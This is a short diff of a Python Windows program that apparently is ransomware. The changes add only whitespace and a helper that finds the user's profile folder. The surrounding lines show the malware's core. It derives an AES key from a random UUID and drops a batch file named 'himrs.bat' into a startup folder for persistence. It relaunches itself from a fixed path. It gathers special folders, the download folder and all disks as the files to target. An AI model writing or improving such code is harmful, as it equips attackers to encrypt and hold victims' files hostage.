@@ -2,6 +2,7 @@ from PyQt5 import QtCore,  QtWidgets
 import sys
 import os
 import uuid
+
 import ctypes
 import hashlib
 from Crypto.Cipher import AES
@@ -13,6 +14,7 @@ use=os.getlogin()
 
 
 
+
 linekey=''
 bsf = str(uuid.uuid4())
 pswd= Des_key.encrypt(bytes.fromhex(hashlib.sha256(bsf.encode()).hexdigest()[:16])).hex()
@@ -21,6 +23,7 @@ bats = f"start {filepath}"
 b = ctypes.create_unicode_buffer(512)
 ctypes.windll.shell32.SHGetSpecialFolderPathW(None, b, 285, False)
 startup = b.value + "\\himrs.bat"
+
 
 if sys.argv[0] != filepath:
     try:
@@ -48,10 +51,14 @@ def getresource():
     for x in c:
         ctypes.windll.shell32.SHGetSpecialFolderPathW(None, b, x, False)
         yield b.value
+def getuse():
+    b = ctypes.create_unicode_buffer(512)
+    ctypes.windll.shell32.SHGetSpecialFolderPathW(None, b, 40, False)
+    return b.value
 
-if "download" in os.listdir(f"C:\\Users\\{use}"):
+if "download" in os.listdir(getuse()):
 
-    folder = list(getresource()) +[f"C:\\Users\\{use}\\download"]+disks()
+    folder = list(getresource()) +[f"{getuse()}\\download"]+disks()
 else:
 
     folder = list(getresource()) +disks()
